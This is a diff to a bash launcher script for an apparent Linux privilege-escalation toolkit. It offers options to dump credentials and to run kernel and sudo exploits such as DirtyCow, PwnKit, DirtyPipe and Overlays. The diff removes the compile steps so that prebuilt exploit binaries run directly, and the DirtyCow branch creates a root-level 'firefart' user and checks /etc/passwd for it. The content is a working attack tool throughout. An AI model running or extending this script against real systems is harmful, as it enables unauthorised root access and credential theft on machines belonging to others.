@@ -30,8 +30,8 @@ if [[ "$*" == "-help" ]]; then
      echo "   -DumpCred      Execute DumpCred"
      echo " "
      echo "Exploits:"
-     echo "   -Overlays      Compilation + execution binaire - CVE-2015-1328"
-     echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
+     echo "   -Overlays      Overlays - CVE-2015-1328"
+     echo "   -DirtyCow      DirtyCow - CVE-2016-5195"
      echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
      echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
      echo "   -Host          Sudo Host - CVE-2025-32462"
@@ -109,19 +109,11 @@ done
 
 # Overlays
 if [[ "$*" == "-Overlays" ]]; then
-     gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
-     echo "[+] Compilation successfuly !"
-     echo "[+] PATH=${PWD}/exploit/Overlays/overlays"
-     echo "[+] Executing the binary..."
      ${PWD}/exploit/Overlays/overlays
 fi
 
 # DirtyCow
 if [[ "$*" == "-DirtyCow" ]]; then
-     gcc -pthread ${PWD}/exploits/DirtyCow/dirtycow.c -o ${PWD}/exploits/DirtyCow/dcow -lcrypt
-     echo "[+] Compilation successfuly !"
-     echo "[+] PATH=${PWD}/exploit/DirtyCow/dcow"
-     echo "[+] Executing the binary..."
      ${PWD}/exploits/DirtyCow/dcow test
      echo "[+] User firefart created"
      cat /etc/passwd | grep 'firefart'
